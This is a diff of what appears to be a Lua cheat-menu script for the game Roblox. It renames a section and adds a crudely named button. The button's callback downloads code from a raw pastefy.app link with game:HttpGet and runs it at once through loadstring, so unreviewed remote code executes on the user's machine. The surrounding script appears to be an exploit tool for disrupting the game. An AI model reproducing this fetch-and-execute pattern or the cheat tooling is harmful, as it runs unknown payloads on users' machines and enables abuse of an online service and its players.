@@ -1053,7 +1053,7 @@ Tab:AddButton({
 
 
 local Section = Tab:AddSection({
-	Name = "Destroyer..."
+	Name = "Sussy Scripts..."
 })
 
 
@@ -1185,6 +1185,17 @@ Tab:AddButton({
 		MakeSnake(SNAKE_LENGTH, SNAKE_SIZE, SNAKE_WOBBLINESS)
 	end	  
 })
+
+
+Tab:AddButton({
+	Name = "Jerk Off",
+	Callback = function()
+
+		script_key=unitpoop;
+loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))()
+end    
+})
+
 
 
 local Tab = Window:MakeTab({
